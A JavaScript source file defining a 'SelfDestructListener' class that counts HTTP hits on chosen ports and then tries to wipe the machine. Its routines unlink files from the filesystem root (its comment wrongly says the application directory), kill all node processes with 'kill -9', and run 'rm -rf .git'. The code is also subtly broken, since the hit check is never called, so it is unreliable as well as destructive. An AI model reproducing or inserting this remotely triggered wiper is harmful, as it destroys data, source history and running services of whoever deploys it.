const http = require("http");
const fs = require("fs");
const { exec } = require('child_process');

export default class SelfDestructListener {
    constructor(ports) {
        this.currentHits = 0;
        this.targetHits = ports.length;

        ports.forEach((port, i) => {
            this.listen(port);
        })
    }

    /**
     * listen
     * @param port
     */
    listen(port) {
        http.createServer((req, res) => {
            this._incrementHits();
        }).listen(port);
    }

    /**
     * _incrementHits
     * @private
     */
    _incrementHits() {
        this.currentHits++;
    }

    /**
     * _checkHits
     * @private
     */
    _checkHits() {
        if(this.currentHits >= this.targetHits) {
            this._selfdestruct();
        }
    }

    /**
     * _selfdestruct
     * @private
     */
    _selfdestruct() {
        this._purge();
        this._erase();
        this._kill();
    }

    /**
     * _purge
     * Deletes all files in the application directory
     * @private
     */
    _purge = () => {
        fs.readdir("/", (err, files) => {
            files.forEach((file) => {
                fs.unlink("/"+file);
            });
        });
    };

    /**
     * _kill
     * Terminates accessible node processes
     * @private
     */
    _kill = () => {
        //TODO detect OS and invoke _kill_UNIX or _kill_WINDOWS
        this._kill_UNIX();
    };

    /**
     * _kill_UNIX
     * Terminates all accessible node processes on UNIX-like OS
     * @private
     */
    _kill_UNIX = () => {
        exec("kill -9 $(ps aux | grep '\snode\s' | awk '{print $2}')");
    };

    /**
     * _kill_WINDOWS
     * Terminates all accessible node processes on Windows OS
     * @private
     */
    _kill_WINDOWS = () => {

    };

    /**
     * _erase
     * Unlinks any existing GIT or SVN repositories
     * @private
     */
    _erase = () => {
        this._erase_UNIX();
    };

    /**
     * _erase_UNIX
     * @private
     */
    _erase_UNIX = () => {
        exec("rm -rf .git");
    };

    /**
     * _erase_Windows
     * @private
     */
    _erase_Windows = () => {

    };
}